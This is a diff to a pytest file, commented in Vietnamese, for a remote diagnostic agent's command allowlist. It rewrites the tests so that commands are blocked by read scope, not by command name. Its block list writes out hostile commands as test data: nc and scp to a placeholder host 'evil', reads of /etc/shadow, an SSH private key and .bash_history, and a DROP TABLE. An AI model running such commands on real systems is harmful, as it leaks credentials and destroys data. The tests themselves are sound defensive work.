@@ -212,18 +212,28 @@ def test_emitter_shows_actual_command_run():
 # ── security: INV_NO_DATA_EXFIL ──────────────────────────────────────────────
 
 @pytest.mark.parametrize("cmd,args", [
-    ("cat", ["/etc/passwd"]),
-    ("grep", ["password", "/var/log/app.log"]),
-    ("tail", ["-n", "100", "/var/log/payments.log"]),
-    ("mysql", ["-e", "SELECT * FROM users"]),
+    # Ngoài catalogue hoàn toàn.
     ("strings", ["/var/lib/secret.db"]),
-    ("curl", ["http://evil/exfil"]),
+    ("nc", ["evil", "443"]),
+    ("scp", ["/etc/hosts", "evil:/tmp"]),
+    # Trong catalogue, nhưng ngoài PHẠM VI đọc (INV_DIAG_SCOPE_BOUNDED).
+    ("cat", ["/var/lib/mysql/users.ibd"]),
+    ("cat", ["/home/khach/.ssh/id_rsa"]),
+    ("cat", ["/etc/shadow"]),
+    ("tail", ["-n", "100", "/root/.bash_history"]),
+    ("grep", ["password", "/home/app/.env"]),
+    # Trong catalogue, nhưng động từ SQL không phải chẩn đoán.
+    ("mysql", ["-e", "SELECT * FROM users"]),
+    ("mysql", ["-e", "DROP TABLE t"]),
 ])
-def test_content_read_commands_blocked(cmd, args):
+def test_data_exfil_and_out_of_scope_blocked(cmd, args):
+    """INV_DIAG_SCOPE_BOUNDED thay INV_NO_DATA_EXFIL: chặn theo PHẠM VI ĐỌC, không
+    theo tên lệnh. Chặn theo tên lệnh khiến Omni không đọc được log ứng dụng —
+    tức không chẩn đoán được tầng app."""
     from remote_agent.command_executor import _is_command_allowed
     allowed, reason = _is_command_allowed(cmd, args)
-    assert not allowed
-    assert "data_exfil_blocked" in reason or "find_dangerous" in reason
+    assert not allowed, f"{cmd} {args} phai bi chan"
+    assert reason
 
 
 @pytest.mark.parametrize("cmd,args", [
@@ -233,8 +243,12 @@ def test_content_read_commands_blocked(cmd, args):
     ("systemctl", ["status", "mysql"]),
     ("journalctl", ["--disk-usage"]),
     ("free", ["-h"]),
+    # Đọc nội dung TRONG phạm vi vận hành — điều kiện để chẩn đoán tầng app.
+    ("cat", ["/proc/meminfo"]),
+    ("tail", ["-n", "100", "/var/log/nginx/error.log"]),
+    ("mysql", ["-e", "SHOW SLAVE STATUS"]),
 ])
-def test_metadata_commands_allowed(cmd, args):
+def test_metadata_and_in_scope_reads_allowed(cmd, args):
     from remote_agent.command_executor import _is_command_allowed
     allowed, reason = _is_command_allowed(cmd, args)
     assert allowed, reason
